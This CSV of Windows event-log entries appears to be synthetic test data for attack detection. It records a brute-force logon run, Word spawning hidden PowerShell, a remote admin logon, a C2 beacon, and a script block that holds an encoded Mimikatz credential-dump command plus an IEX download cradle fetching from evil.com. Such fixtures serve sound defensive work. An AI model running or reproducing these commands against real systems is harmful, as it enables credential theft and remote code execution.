EventId,TimeCreated,Channel,Payload
4104,2026-04-25T10:00:00,Microsoft-Windows-PowerShell/Operational,"{""ScriptBlockId"": ""GUID-1"", ""MessageNumber"": ""1"", ""MessageTotal"": ""1"", ""ScriptBlockText"": ""powershell -enc SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA==; IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')""}"
4688,2026-04-25T10:01:00,Security,"{""ParentProcessName"": ""C:\\Program Files\\Microsoft Office\\winword.exe"", ""NewProcessName"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""CommandLine"": ""powershell -w hidden -enc ABCD""}"
4624,2026-04-25T10:02:00,Security,"{""LogonType"": ""10"", ""TargetUserName"": ""admin"", ""IpAddress"": ""203.0.113.9"", ""WorkstationName"": ""ATTACKER""}"
3,2026-04-25T10:03:00,Microsoft-Windows-Sysmon/Operational,"{""DestinationIp"": ""198.51.100.7"", ""DestinationHostname"": ""c2.evil.net"", ""Image"": ""C:\\x\\beacon.exe""}"
4625,2026-04-25T09:00:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:01:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:02:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:03:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:04:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:05:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:06:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:07:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:08:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:09:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:10:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
4625,2026-04-25T09:11:00,Security,"{""TargetUserName"": ""administrator"", ""IpAddress"": ""203.0.113.9""}"
